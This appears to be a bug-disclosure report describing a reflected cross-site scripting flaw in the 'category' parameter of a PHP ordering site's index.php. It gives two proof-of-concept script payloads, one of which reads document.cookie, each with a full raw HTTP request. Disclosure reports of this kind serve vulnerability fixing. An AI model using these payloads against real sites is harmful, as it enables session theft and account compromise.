BUG_Author:mengleng

Vulnerability File: /bsenordering/index.php

GET parameter 'category' exists XSS vulnerability

Payload1:/bsenordering/index.php?category=<script>alert(222)</script>&q=product

```
GET /bsenordering/index.php?category=%3Cscript%3Ealert(222)%3C/script%3E&q=product HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=8e6rkj7p73lhg2ik56f55rfoc2
Connection: close
```

![image](https://github.com/2714925725/bug_report/blob/main/pic/xss1.png)

Payload2:/bsenordering/index.php?category=<script>alert(document.cookie)</script>&q=product

```
GET /bsenordering/index.php?category=%3Cscript%3Ealert(document.cookie)%3C/script%3E&q=product HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=8e6rkj7p73lhg2ik56f55rfoc2
Connection: close
```

![image](https://github.com/2714925725/bug_report/blob/main/pic/xss2.png)
